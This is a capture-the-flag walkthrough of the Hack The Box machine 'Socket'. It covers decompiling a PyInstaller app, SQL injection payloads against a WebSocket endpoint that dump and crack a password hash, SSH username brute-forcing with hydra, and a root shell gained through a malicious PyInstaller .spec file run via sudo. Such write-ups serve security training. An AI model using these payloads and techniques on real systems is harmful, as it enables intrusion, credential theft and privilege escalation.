---
layout: single
title: Socket - Hack The Box
date: 2023-07-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-socket/socket_logo.png
categories:
  - hackthebox
tags:
  - hackthebox
  - linux
  - python
  - sqlite
  - websockets
  - pyinstaller
---


![](/assets/images/htb-writeup-socket/socket_logo.png)

### Summary
------------------
- Extracting a python compiled application with `pyinstxtractor`.
- Decompiling pyc file with `pycdc`.
- Abusing a SQL injection in `sqlite` database.
- Bruteforce username for login into ssh.
- Abusing `pyinstaller` to obtain a root shell.

### Shell as tkeller
------------------

### Nmap


```
Nmap scan report for 10.10.11.206
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://qreader.htb/
5789/tcp open  unknown
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 28 Jul 2023 20:54:23 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   Help, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 28 Jul 2023 20:54:39 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
```

In this initial scan we can see it is running ssh on port 22 and a Apache service on port 80.    
We can also see it is running a python WebSocket service on port 5789.

### Inspecting Web page

![](/assets/images/htb-writeup-socket/web1.png)

Nothing here so far, template injection when reading a QR Code does not work.    
But if we see below we can download an app image for linux.

![](/assets/images/htb-writeup-socket/web2.png)

A zip archive called `QReader_lin_v0.0.2.zip` downloads.    
When extracted it shows two files:    

```
history ~ $ unzip QReader_lin_v0.0.2.zip
Archive:  QReader_lin_v0.0.2.zip
   creating: app/
  inflating: app/qreader
  inflating: app/test.png
```

It downloads a test.png which seems to be a QR Code and a binary executable called qreader.    
When executing the binary, a GUI pops up:

![](/assets/images/htb-writeup-socket/qreader.png)

### Decompiling Python app

If we import a non-image file and try to read embedded content, the application will crash and give a very useful error message:

```
Traceback (most recent call last):
  File "qreader.py", line 202, in read_code
cv2.error: OpenCV(4.6.0) /io/opencv/modules/objdetect/src/qrcode.cpp:29: error: (-215:Assertion failed) !img.empty() in function 'checkQRInputImage'
Aborted (core dumped)
```

We see it is a python compiled application.    
There are a lot of tools to extract a compiled python app, but I will use `pyinstxtractor`.

```
history pyinstxtractor $ python3 pyinstxtractor.py ../app/qreader
[+] Processing ../app/qreader
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 108535118 bytes
[+] Found 305 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_pyqt5.pyc
[+] Possible entry point: pyi_rth_setuptools.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: qreader.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: ../app/qreader

You can now use a python decompiler on the pyc files within the extracted directory
history pyinstxtractor $ ls qreader_extracted/
_cffi_backend.cpython-310-x86_64-linux-gnu.so  libcrypto-d21001fc.so.1.1      libgmodule-2.0.so.0  liblz4.so.1                        libQt5EglFsKmsSupport.so.5         libuuid.so.1              libxcb-sync.so.1       psutil
base_library.zip                               libcrypto.so.3                 libgobject-2.0.so.0  liblzma.so.5                       libQt5Gui.so.5                     libvpx-f22f1483.so.7.0.0  libxcb-util.so.1       pyi_rth_inspect.pyc
cv2                                            libdatrie.so.1                 libgomp.so.1         libmd.so.0                         libQt5Network.so.5                 libwacom.so.9             libxcb-xfixes.so.0     pyi_rth_multiprocessing.pyc
importlib_metadata-4.6.4.egg-info              libdbus-1.so.3                 libgpg-error.so.0    libmd4c.so.0                       libQt5Svg.so.5                     libwayland-client.so.0    libxcb-xinerama.so.0   pyi_rth_pkgres.pyc
lib-dynload                                    libdeflate.so.0                libgraphite2.so.3    libmount.so.1                      libQt5Widgets.so.5                 libwayland-cursor.so.0    libxcb-xinput.so.0     pyi_rth_pkgutil.pyc
libatk-1.0.so.0                                libdouble-conversion.so.3      libgssapi_krb5.so.2  libmpdec.so.3                      libQt5XcbQpa.so.5                  libwayland-egl.so.1       libxcb-xkb.so.1        pyi_rth_pyqt5.pyc
libatk-bridge-2.0.so.0                         libepoxy.so.0                  libgtk-3.so.0        libmtdev.so.1                      libquadmath-96973f99.so.0.0.0      libwayland-server.so.0    libXcomposite.so.1     pyi_rth_setuptools.pyc
libatspi.so.0                                  libevdev.so.2                  libgudev-1.0.so.0    libncursesw.so.6                   libquadmath.so.0                   libwebp.so.7              libXcursor.so.1        pyi_rth_subprocess.pyc
libavcodec-5896f664.so.58.134.100              libexpat.so.1                  libharfbuzz.so.0     libopenblas-r0-f650aae0.3.3.so     libraqm.so.0                       libwebpdemux.so.2         libXdamage.so.1        pyiboot01_bootstrap.pyc
libavformat-8ef5c7db.so.58.76.100              libffi.so.8                    libICE.so.6          libopenjp2.so.7                    libreadline.so.8                   libwebpmux.so.3           libXdmcp.so.6          pyimod01_archive.pyc
libavutil-9c768859.so.56.70.100                libfontconfig.so.1             libicudata.so.72     libpango-1.0.so.0                  libselinux.so.1                    libX11-xcb.so.1           libXext.so.6           pyimod02_importers.pyc
libblas.so.3                                   libfreetype.so.6               libicui18n.so.72     libpangocairo-1.0.so.0             libSM.so.6                         libX11.so.6               libXfixes.so.3         pyimod03_ctypes.pyc
libblkid.so.1                                  libfribidi.so.0                libicuuc.so.72       libpangoft2-1.0.so.0               libssl-c8c53640.so.1.1             libXau.so.6               libXi.so.6             PyQt5
libbrotlicommon.so.1                           libgbm.so.1                    libimagequant.so.0   libpcre2-8.so.0                    libssl.so.3                        libxcb-glx.so.0           libXinerama.so.1       PYZ-00.pyz
libbrotlidec.so.1                              libgcc_s.so.1                  libinput.so.10       libpcre2-16.so.0                   libstdc++.so.6                     libxcb-icccm.so.4         libxkbcommon-x11.so.0  PYZ-00.pyz_extracted
libbsd.so.0                                    libgcrypt.so.20                libjbig.so.0         libpixman-1.so.0                   libswresample-99364a1c.so.3.9.100  libxcb-image.so.0         libxkbcommon.so.0      qreader.pyc
libbz2-a273e504.so.1.0.6                       libgdk-3.so.0                  libjpeg.so.62        libpng16-57e5e0a0.so.16.37.0       libswscale-e6451464.so.5.9.100     libxcb-keysyms.so.1       libXrandr.so.2         setuptools-59.6.0.egg-info
libbz2.so.1.0                                  libgdk_pixbuf-2.0.so.0         libk5crypto.so.3     libpng16.so.16                     libsystemd.so.0                    libxcb-randr.so.0         libXrender.so.1        sip.cpython-310-x86_64-linux-gnu.so
libcairo-gobject.so.2                          libgfortran-91cc3cb1.so.3.0.0  libkeyutils.so.1     libpython3.10.so.1.0               libthai.so.0                       libxcb-render-util.so.0   libz.so.1              struct.pyc
libcairo.so.2                                  libgfortran.so.5               libkrb5.so.3         libQt5Core.so.5                    libtiff.so.5                       libxcb-render.so.0        libzstd.so.1           websockets-10.2.egg-info
libcap.so.2                                    libgio-2.0.so.0                libkrb5support.so.0  libQt5DBus.so.5                    libtinfo.so.6                      libxcb-shape.so.0         numpy                  wheel-0.37.1.egg-info
libcom_err.so.2                                libglib-2.0.so.0               liblapack.so.3       libQt5EglFSDeviceIntegration.so.5  libudev.so.1                       libxcb-shm.so.0           PIL
```

So I can see within the extracted files a `qreader.pyc`, which is likely to be the `main.py` of the program.    
We can copy `qreader.pyc` and decompile it with `pycdc`.

```
history ~ $ ./pycdc qreader.pyc
```

And it gives the decompiled python file:

```python
# Source Generated with Decompyle++
# File: qreader.pyc (Python 3.10)

import cv2
import sys
import qrcode
import tempfile
import random
import os
from PyQt5.QtWidgets import *
from PyQt5 import uic, QtGui
import asyncio
import websockets
import json
VERSION = '0.0.2'
ws_host = 'ws://ws.qreader.htb:5789'
icon_path = './icon.png'

def setup_env():
Unsupported opcode: WITH_EXCEPT_START
    global tmp_file_name
    pass
# WARNING: Decompyle incomplete


class MyGUI(QMainWindow):

    def __init__(self = None):
        super(MyGUI, self).__init__()
        uic.loadUi(tmp_file_name, self)
        self.show()
        self.current_file = ''
        self.actionImport.triggered.connect(self.load_image)
        self.actionSave.triggered.connect(self.save_image)
        self.actionQuit.triggered.connect(self.quit_reader)
        self.actionVersion.triggered.connect(self.version)
        self.actionUpdate.triggered.connect(self.update)
        self.pushButton.clicked.connect(self.read_code)
        self.pushButton_2.clicked.connect(self.generate_code)
        self.initUI()


    def initUI(self):
        self.setWindowIcon(QtGui.QIcon(icon_path))


    def load_image(self):
        options = QFileDialog.Options()
        (filename, _) = QFileDialog.getOpenFileName(self, 'Open File', '', 'All Files (*)')
        if filename != '':
            self.current_file = filename
            pixmap = QtGui.QPixmap(self.current_file)
            pixmap = pixmap.scaled(300, 300)
            self.label.setScaledContents(True)
            self.label.setPixmap(pixmap)
            return None


    def save_image(self):
        options = QFileDialog.Options()
        (filename, _) = QFileDialog.getSaveFileName(self, 'Save File', '', 'PNG (*.png)', options, **('options',))
        if filename != '':
            img = self.label.pixmap()
            img.save(filename, 'PNG')
            return None


    def read_code(self):
        if self.current_file != '':
            img = cv2.imread(self.current_file)
            detector = cv2.QRCodeDetector()
            (data, bbox, straight_qrcode) = detector.detectAndDecode(img)
            self.textEdit.setText(data)
            return None
        None.statusBar().showMessage('[ERROR] No image is imported!')


    def generate_code(self):
        qr = qrcode.QRCode(1, qrcode.constants.ERROR_CORRECT_L, 20, 2, **('version', 'error_correction', 'box_size', 'border'))
        qr.add_data(self.textEdit.toPlainText())
        qr.make(True, **('fit',))
        img = qr.make_image('black', 'white', **('fill_color', 'back_color'))
        img.save('current.png')
        pixmap = QtGui.QPixmap('current.png')
        pixmap = pixmap.scaled(300, 300)
        self.label.setScaledContents(True)
        self.label.setPixmap(pixmap)


    def quit_reader(self):
        if os.path.exists(tmp_file_name):
            os.remove(tmp_file_name)
        sys.exit()


    def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)


    def update(self):
        response = asyncio.run(ws_connect(ws_host + '/update', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            msg = '[INFO] ' + data['message']
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)

    __classcell__ = None


async def ws_connect(url, msg):
Unsupported opcode: GEN_START
    pass
# WARNING: Decompyle incomplete


def main():
    (status, e) = setup_env()
    if not status:
        print('[-] Problem occured while setting up the env!')
    app = QApplication([])
    window = MyGUI()
    app.exec_()

if __name__ == '__main__':
    main()
    return None
```

Once we have the decompiled code, we can see that is connecting to a WebSocket server:

```python
...
VERSION = '0.0.2'
ws_host = 'ws://ws.qreader.htb:5789'
icon_path = './icon.png'
...
```

### Enumerating WebSocket service

Once I know how to interact with the WebSocket service, I will enumerate it.    
I will make a simple python script that will make a simple connection with the ws server.

```python
import websocket

ws = websocket.create_connection("ws://ws.qreader.htb:5789")
ws.send("test")
print(ws.recv())
```

It does not respond with anything, but I can see in that qreader is sending some json data, so I will try to send an empty json object.

```python
import websocket
import json

ws = websocket.create_connection("ws://ws.qreader.htb:5789")
ws.send(json.dumps({}))
print(ws.recv())
```

And it responds with:

```
{"paths": {"/update": "Check for updates", "/version": "Get version information"}}
```

So I can see `/update` and `/version`, the same as in `qreader`.    
I will enumerate `/version`, and I can see in the source code that is sending a `version` value to the server.    

```
...
    def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
...
```

If I try to do that, the server responds the version information:

```
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```

### SQLite Injection

The next thing to try is SQL injection.    
I will upgrade my python script so I do not have to edit it anymore.

```python
import websocket
import json
import sys

ws = websocket.create_connection("ws://ws.qreader.htb:5789/version")
ws.send(json.dumps({"version":sys.argv[1]}))
print(ws.recv())
```

And I will send a simple test query for seeing if it is vulnerable.

```
history ~ $ python3 web.py '0" OR 1=1-- -'
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```

And we can see it is vulnerable to SQL injection.    
Now it is time to detect the database server.

```
history ~ $ python3 web.py '0" OR sqlite_version()=sqlite_version()-- -'
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```

And we can see it does not give any error, so it is running `sqlite` as backend DBMS.    
Once we know that, we can try a union injection.

```
history ~ $ python3 web.py '0" UNION SELECT 1,2,3,4-- -'
{"message": {"id": 1, "version": 2, "released_date": 3, "downloads": 4}}
```

So now that we know that we can perform a union injection, we can dump all table names:

```
history ~ $ python3 web.py '0" UNION SELECT 1,2,group_concat(tbl_name),4 FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%"-- -'
{"message": {"id": 1, "version": 2, "released_date": "versions,users,info,reports,answers", "downloads": 4}}
```

And we have the tables: `versions,users,info,reports,answers`.    
Now we will need to know the structure of the table users, it is the most likely to have passwords or relevant information.

```
history ~ $ python3 web.py '0" UNION SELECT 1,2,sql,4 FROM sqlite_master WHERE type!="meta" AND sql NOT NULL AND name ="users"-- -'
{"message": {"id": 1, "version": 2, "released_date": "CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)", "downloads": 4}}
```

We can see two interesting fields, `username` and `password`.    
It is time to dump them.

```
history ~ $ python3 web.py '0" UNION SELECT 1,username,password,4 FROM users-- -'
{"message": {"id": 1, "version": "admin", "released_date": "0c090c365fa0559b151a43e0fea39710", "downloads": 4}}
```

The output shows that we have a username called `admin` with password hash `0c090c365fa0559b151a43e0fea39710`.    
Let's check for any other user that is not `admin`:

```
history ~ $ python3 web.py '0" UNION SELECT 1,username,password,4 FROM users WHERE username != "admin"-- -'
{"message": "Invalid version!"}
```

And it gives error, so there are no more users.    
I will save `admin:0c090c365fa0559b151a43e0fea39710` in the file `hash` and crack it with `john`:

```
history ~ $ john hash --wordlist=/opt/wordlists/rockyou.txt --format=raw-md5
Created directory: /home/s0ck37/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
denjanjade122566 (admin)
1g 0:00:00:00 DONE (2023-07-29 01:05) 1.694g/s 14713Kp/s 14713Kc/s 14713KC/s denlanie..denize2
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

And we obtain the clear text password for `admin`: `denjanjade122566`.    
However we can not ssh with that credentials, so let's keep enumerating the database.    
We will dump the structure of the table `answers`:

```
history ~ $ python3 web.py '0" UNION SELECT 1,2,sql,4 FROM sqlite_master WHERE type!="meta" AND sql NOT NULL AND name ="answers"-- -'
{"message": {"id": 1, "version": 2, "released_date": "CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))", "downloads": 4}}
```

We can see there is a field called `answer`.

```
history ~ $ python3 web.py '0" UNION SELECT 1,2,answer,4 FROM answers-- -'
{"message": {"id": 1, "version": 2, "released_date": "Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller", "downloads": 4}}
```

And we can see that a user called `Thomas Keller` is answering to a user called `Mike`.    
Now we have 2 users that we can try login to ssh to with the password cracked before.    
I will write in a file the potential users to try with `hydra`.

```
history ~ $ cat users.txt
mike
thomas.keller
thomas
tkeller
t.keller
keller
keller.t
```

Now I will bruteforce the ssh with `hydra`:

```
history ~ $ hydra -L users.txt -p denjanjade122566 ssh://10.10.11.206
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-29 01:13:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:7/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.206:22/
[22][ssh] host: 10.10.11.206   login: tkeller   password: denjanjade122566
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-29 01:13:10
```

And we have ssh credentials: `tkeller:denjanjade122566`.    

### Shell as root
------------------

Now we are on the machine and we know the password, we should run `sudo -l` to see if there are misconfigured sudo permissions.

```
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

And we can see that `tkeller` can run `/usr/local/sbin/build-installer.sh` as root.    

```bash
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

It looks like a simple script that compiles `.py` files. but we notice that we can also specify a `.spec` file.    
If we go to the `pyinstaller` documentation we can read:

![](/assets/images/htb-writeup-socket/spec.png)

So it actually executes the code in the spec file.    
I will make a malicious `.spec` file and I will try to run it with the script as root.

```
tkeller@socket:~$ echo 'import os;os.system("/bin/bash")' > exploit.spec
```

Now that we have the malicious code in `exploit.spec`, we execute the script as root:

```
tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build exploit.spec
207 INFO: PyInstaller: 5.6.2
207 INFO: Python: 3.10.6
213 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
221 INFO: UPX is not available.
root@socket:/home/tkeller# whoami
root
```

And we get the sell as root.    
Cheers!
